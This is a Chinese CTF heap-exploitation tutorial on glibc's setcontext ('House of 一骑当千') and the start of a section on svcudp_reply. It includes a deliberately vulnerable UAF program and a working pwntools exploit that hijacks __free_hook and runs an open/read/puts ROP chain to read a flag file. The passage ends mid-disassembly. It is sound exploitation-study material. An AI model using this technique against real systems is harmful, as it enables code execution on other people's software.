@@ -1,0 +1,442 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h1 data-content="1" id="b3a1ac648a67d924733e9aee288b8c8a">house of 一骑当千&amp;&amp;svcudp_reply</h1>
+<h2 data-content="1" id="ff18a80521f56ed20d1488c3c5f28593">原理</h2>
+<p>通常我们利用 <code>setcontext + 53</code> 通过 rdi 指向的内存给寄存器赋值，但是从 glibc-2-29 开始，setcontext 通过 rdx 指向的内存给寄存器赋值。</p>
+<p>通常情况可以采用 gadget 对 rdx 赋值然后跳转到 setcontext gadget 继续执行，但使用 gadget 需要我们能控制 rdi 寄存器指向的内存的前几个字节，并且未来的 glibc 的 setcontext 也可能不再使用 rdx 寄存器。</p>
+<p>因此我们需要一个通用的方法比如直接调用 setcontext 函数对寄存器赋值，而这中直接调用 setcontext 的方法就是 House of 一骑当千。</p>
+<p>这种方法是看雪中的一个师傅，国资社畜师傅提出来的一种利用方式</p>
+<p>这种方式是为了防止以后的setcontext函数，不止从rdi改到rdx，甚至改写成rcx，r15，到那时仅仅依靠一些gadget恐怕难以再次利用，而house of 一骑当千就是利用setcontext本身对其进行赋值</p>
+<p>setcontext 函数原型为 <code>int setcontext(const ucontext_t *ucp)</code> ，其中 <code>ucontext_t</code> 结构体定义如下：</p>
+<div class="highlight"><pre><span></span><span class="k">struct</span> <span class="n">_libc_fpstate</span>
+<span class="p">{</span>
+  <span class="cm">/* 64-bit FXSAVE format.  */</span>
+  <span class="n">__uint16_t</span>        <span class="n">__ctx</span><span class="p">(</span><span class="n">cwd</span><span class="p">);</span>
+  <span class="n">__uint16_t</span>        <span class="nf">__ctx</span><span class="p">(</span><span class="n">swd</span><span class="p">);</span>
+  <span class="n">__uint16_t</span>        <span class="nf">__ctx</span><span class="p">(</span><span class="n">ftw</span><span class="p">);</span>
+  <span class="n">__uint16_t</span>        <span class="nf">__ctx</span><span class="p">(</span><span class="n">fop</span><span class="p">);</span>
+  <span class="n">__uint64_t</span>        <span class="nf">__ctx</span><span class="p">(</span><span class="n">rip</span><span class="p">);</span>
+  <span class="n">__uint64_t</span>        <span class="nf">__ctx</span><span class="p">(</span><span class="n">rdp</span><span class="p">);</span>
+  <span class="n">__uint32_t</span>        <span class="nf">__ctx</span><span class="p">(</span><span class="n">mxcsr</span><span class="p">);</span>
+  <span class="n">__uint32_t</span>        <span class="nf">__ctx</span><span class="p">(</span><span class="n">mxcr_mask</span><span class="p">);</span>
+  <span class="k">struct</span> <span class="n">_libc_fpxreg</span>   <span class="n">_st</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+  <span class="k">struct</span> <span class="n">_libc_xmmreg</span>   <span class="n">_xmm</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="n">__uint32_t</span>        <span class="n">__glibc_reserved1</span><span class="p">[</span><span class="mi">24</span><span class="p">];</span>
+<span class="p">};</span>
+
+
+
+<span class="cm">/* Userlevel context.  */</span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">ucontext_t</span>
+  <span class="p">{</span>
+    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">__ctx</span><span class="p">(</span><span class="n">uc_flags</span><span class="p">);</span>
+    <span class="k">struct</span> <span class="n">ucontext_t</span> <span class="o">*</span><span class="n">uc_link</span><span class="p">;</span>
+    <span class="n">stack_t</span> <span class="n">uc_stack</span><span class="p">;</span>
+    <span class="n">mcontext_t</span> <span class="n">uc_mcontext</span><span class="p">;</span>
+    <span class="kt">sigset_t</span> <span class="n">uc_sigmask</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">_libc_fpstate</span> <span class="n">__fpregs_mem</span><span class="p">;</span>
+    <span class="n">__extension__</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="kt">int</span> <span class="n">__ssp</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+  <span class="p">}</span> <span class="n">ucontext_t</span><span class="p">;</span>
+</pre></div>
+<p>而这个原型函数只有一个参数，那么这个参数一定是位于rdi寄存器，如果这样的话，那以后不论再依靠什么寄存器，只要我们从原始函数入手，那么就永远会是rdi寄存器</p>
+<p>回到题目中，我们普遍是将setcontext函数与frame结构体一同利用，而这个结构体其实就是上面的源代码中的一部分</p>
+<p>而这个函数是由汇编所写，除了信号量系统调(<code>__NR_rt_sigprocmask</code>)用外，无非就是一些赋值操作。在<code>setcontext</code>函数中，除了对<code>mcontext_t uc_mcontext;</code> <code>sigset_t uc_sigmask;</code> <code>struct _libc_fpstate __fpregs_mem __ssp</code>这4个进行操作外，并没有对其他部分操作，也就是我们可以不关心其他的值。</p>
+<p>那我们就需要重点看着四个部分</p>
+<p>uc_mcontext</p>
+<div class="highlight"><pre><span></span><span class="cm">/* Context to describe whole processor state.  */</span>
+<span class="k">typedef</span> <span class="k">struct</span>
+  <span class="p">{</span>
+    <span class="n">gregset_t</span> <span class="n">__ctx</span><span class="p">(</span><span class="n">gregs</span><span class="p">);</span>
+    <span class="cm">/* Note that fpregs is a pointer.  */</span>
+    <span class="n">fpregset_t</span> <span class="nf">__ctx</span><span class="p">(</span><span class="n">fpregs</span><span class="p">);</span>
+    <span class="n">__extension__</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">__reserved1</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="p">}</span> <span class="n">mcontext_t</span><span class="p">;</span>
+</pre></div>
+<p>这个就是存储寄存器的结构体，也是我们平时<code>setcontext+53</code>所使用的地方。有关数据设置和传统利用<code>setcontext+53</code>时一样即可。</p>
+<p>__fpregs_mem</p>
+<p>这个所对应的步骤为<code>setcontext</code>中的如下内容，作用使加载浮点环境，需要可写。偏移为<code>0xe0</code>。</p>
+<p><strong>注意 <code>fpregs</code> 指针需要指向一块可读写内存。</strong></p>
+<div class="highlight"><pre><span></span><span class="cm">/* Restore the floating-point context.  Not the registers, only the</span>
+<span class="cm">       rest.  */</span>
+    <span class="n">movq</span>    <span class="n">oFPREGS</span><span class="p">(</span><span class="o">%</span><span class="n">rdx</span><span class="p">),</span> <span class="o">%</span><span class="n">rcx</span>
+    <span class="n">fldenv</span>    <span class="p">(</span><span class="o">%</span><span class="n">rcx</span><span class="p">)</span>
+</pre></div>
+<p>uc_sigmask</p>
+<p>这个主要是负责信号量，<strong>经测试全是0就可以，当然也可以使用其他程序拷贝过来的信号量。</strong></p>
+<p>__ssp</p>
+<p>这个所对应的步骤为<code>setcontext</code>中的如下内容，作用使加载 MXCSR 寄存器，经测试0也行，偏移为<code>0x1c0</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241005193046-43b66bd2-830d-1.png"/></p>
+<h2 data-content="1" id="a9297e3fba732cddbac33c8d76496e4b">题目</h2>
+<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+
+<span class="kt">char</span> <span class="o">*</span><span class="n">chunk_list</span><span class="p">[</span><span class="mh">0x100</span><span class="p">];</span>
+
+<span class="kt">void</span> <span class="nf">menu</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"1. add chunk"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"2. delete chunk"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"3. edit chunk"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"4. show chunk"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"5. exit"</span><span class="p">);</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"choice:"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">get_num</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+    <span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">add_chunk</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"size:"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">size</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
+    <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">delete_chunk</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">edit_chunk</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"length:"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">length</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"content:"</span><span class="p">);</span>
+    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">],</span> <span class="n">length</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">show_chunk</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"index:"</span><span class="p">);</span>
+    <span class="kt">int</span> <span class="n">index</span> <span class="o">=</span> <span class="n">get_num</span><span class="p">();</span>
+    <span class="n">puts</span><span class="p">(</span><span class="n">chunk_list</span><span class="p">[</span><span class="n">index</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">menu</span><span class="p">();</span>
+        <span class="k">switch</span> <span class="p">(</span><span class="n">get_num</span><span class="p">())</span> <span class="p">{</span>
+            <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+                <span class="n">add_chunk</span><span class="p">();</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+                <span class="n">delete_chunk</span><span class="p">();</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+                <span class="n">edit_chunk</span><span class="p">();</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
+                <span class="n">show_chunk</span><span class="p">();</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="k">case</span> <span class="mi">5</span><span class="o">:</span>
+                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+            <span class="k">default</span><span class="o">:</span>
+                <span class="n">puts</span><span class="p">(</span><span class="s">"invalid choice."</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>这是题目使用的源代码，大家可以自行编译，题目存在uaf，所以泄露地址和劫持free_hook就不再多说</p>
+<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">'debug'</span><span class="p">,</span> <span class="n">arch</span> <span class="o">=</span> <span class="s1">'amd64'</span><span class="p">,</span> <span class="n">os</span> <span class="o">=</span> <span class="s1">'linux'</span><span class="p">)</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./pwn"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"libc.so.6"</span><span class="p">)</span>
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s2">"/home/gets/pwn/study/heap/setcontext/house of 一骑当千/ld-linux-x86-64.so.2"</span><span class="p">,</span> <span class="s2">"./pwn"</span><span class="p">],</span>
+            <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">"LD_PRELOAD"</span><span class="p">:</span><span class="s2">"/home/gets/pwn/study/heap/setcontext/house of 一骑当千/libc.so.6"</span><span class="p">})</span>
+
+<span class="k">def</span> <span class="nf">dbg</span><span class="p">():</span>
+    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"size:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>    
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"length:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)))</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"content:"</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"choice:"</span><span class="p">,</span> <span class="s2">"4"</span><span class="p">)</span>
+    <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">"index:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span>
+
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'</span><span class="se">\x7F</span><span class="s1">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3b6be0</span>
+<span class="n">info</span><span class="p">(</span><span class="s2">"libc base: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]))</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span>
+<span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">)</span><span class="c1">#free_hook</span>
+</pre></div>
+<p>随后我们指定一个buf的地址，这个地址是free_hook加0x100,我们是要将其放上flag字符串，从free_hook到buf之间吗，放上我们的orw链</p>
+<div class="highlight"><pre><span></span><span class="n">buf_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">+</span> <span class="mh">0x100</span>
+<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'__free_hook'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">8</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'open'</span><span class="p">]</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">buf_addr</span>
+<span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">[</span><span class="s1">'&amp;fpstate'</span><span class="p">]</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x3b8000</span> <span class="o">+</span> <span class="mh">0x1000</span>
+<span class="n">frame</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+</pre></div>
+<p>然后写我们的frame结构体，这个结构体起到open的效果，同时栈迁移到free_hook-8的地方，和正常的写法不一样的是，我们需要额外写一行frame['&amp;fpstate'] = libc.address + 0x3b8000 + 0x1000，后面的这个地址就是随意找的一段可读写的位置，可以使用vmmap去寻找</p>
+<p>然后写入payload到free_hook</p>
+<div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">'setcontext'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rsi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdx; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'read'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">asm</span><span class="p">(</span><span class="s1">'pop rdi; ret;'</span><span class="p">),</span> <span class="n">executable</span><span class="o">=</span><span class="bp">True</span><span class="p">)))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">'puts'</span><span class="p">])</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'./flag</span><span class="se">\x00</span><span class="s1">'</span>
+</pre></div>
+<p>payload的第一行写上setcontext函数，不需要加53或者61，后面写上rop链，然后向某个堆块写入frame结构体，把它free掉，我们跟着gdb看看</p>
+<div class="highlight"><pre><span></span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">frame</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</pre></div>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241005193133-5fb2e70c-830d-1.png"/></p>
+<p>程序在free的时候，先执行free hook里面填入的setcontext函数，跳转到里面</p>
+<p>而由于我们free的堆块里面填入的是frame结构体，所以这个时候rdi指向这个结构体</p>
+<p>而在最开始，执行push rdi语句，把这个堆块地址压入栈中，后续执行了pop rdx，这个时候rdx里面就会放上我们的堆块地址</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241005193158-6e724670-830d-1.png"/></p>
+<p>注意看这个时候的栈</p>
+<p>而一直执行到下面两句的时候</p>
+<div class="highlight"><pre><span></span><span class="mh">0x7fa706895d15</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">37</span><span class="o">&gt;</span>    <span class="n">mov</span>    <span class="n">rcx</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdx</span> <span class="o">+</span> <span class="mh">0xe0</span><span class="p">]</span>     <span class="n">RCX</span><span class="p">,</span> <span class="p">[</span><span class="mh">0x555556554380</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="mh">0x7fa706c08000</span> <span class="p">(</span><span class="n">rdata</span><span class="p">)</span> <span class="err">◂—</span> <span class="mi">0</span>
+<span class="mh">0x7fa706895d1c</span> <span class="o">&lt;</span><span class="n">setcontext</span><span class="o">+</span><span class="mi">44</span><span class="o">&gt;</span>    <span class="n">fldenv</span> <span class="p">[</span><span class="n">rcx</span><span class="p">]</span>
+</pre></div>
+<p>我们rdx加0xe0的位置，就是上面写的frame结构体多出来的那句，而fldenv语句我们不需要知道，我们只需要知道，这个时候的rcx里面是一段可读写的内存就可以平稳过渡掉这一句</p>
+<p>再然后就是正常会执行orw，那么这个方法其实就是放弃一些gadget，而去使用setcontext本身进行利用，而这种方法其实是更加极限的利用手段，防止常用的两个gadget没有了或者后续改成别的寄存器</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241005193212-771a9fa2-830d-1.png"/></p>
+<p>当然，除了setcontext之外，也有师傅发现了另一个可以起到类似作用的函数，svcudp_reply</p>
+<h2 data-content="1" id="b7acdfdb83d73538136f4bf597c0bbbe">svcudp_reply</h2>
+<p>还是上面这道题，我们先来看一下这个函数</p>
+<div class="highlight"><pre><span></span><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">u</span> <span class="o">&amp;</span><span class="n">svcudp_reply</span> <span class="mi">30</span>
+ <span class="err">►</span> <span class="mh">0x7fa90f6fef20</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">&gt;</span>        <span class="n">push</span>   <span class="n">r15</span>
+   <span class="mh">0x7fa90f6fef22</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">2</span><span class="o">&gt;</span>      <span class="n">push</span>   <span class="n">r14</span>
+   <span class="mh">0x7fa90f6fef24</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">4</span><span class="o">&gt;</span>      <span class="n">push</span>   <span class="n">r13</span>
+   <span class="mh">0x7fa90f6fef26</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">6</span><span class="o">&gt;</span>      <span class="n">mov</span>    <span class="n">r13</span><span class="p">,</span> <span class="n">rsi</span>
+   <span class="mh">0x7fa90f6fef29</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">9</span><span class="o">&gt;</span>      <span class="n">xor</span>    <span class="n">esi</span><span class="p">,</span> <span class="n">esi</span>                        <span class="n">ESI</span> <span class="o">=&gt;</span> <span class="mi">0</span>
+   <span class="mh">0x7fa90f6fef2b</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">11</span><span class="o">&gt;</span>     <span class="n">push</span>   <span class="n">r12</span>
+   <span class="mh">0x7fa90f6fef2d</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">13</span><span class="o">&gt;</span>     <span class="n">push</span>   <span class="n">rbx</span>
+   <span class="mh">0x7fa90f6fef2e</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">14</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rbx</span><span class="p">,</span> <span class="n">rdi</span>
+   <span class="mh">0x7fa90f6fef31</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">17</span><span class="o">&gt;</span>     <span class="n">push</span>   <span class="n">rbp</span>
+   <span class="mh">0x7fa90f6fef32</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">18</span><span class="o">&gt;</span>     <span class="n">sub</span>    <span class="n">rsp</span><span class="p">,</span> <span class="mh">0x18</span>
+   <span class="mh">0x7fa90f6fef36</span> <span class="o">&lt;</span><span class="n">svcudp_reply</span><span class="o">+</span><span class="mi">22</span><span class="o">&gt;</span>     <span class="n">mov</span>    <span class="n">rbp</span><span class="p">,</span> <span class="n">qword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">]</span>
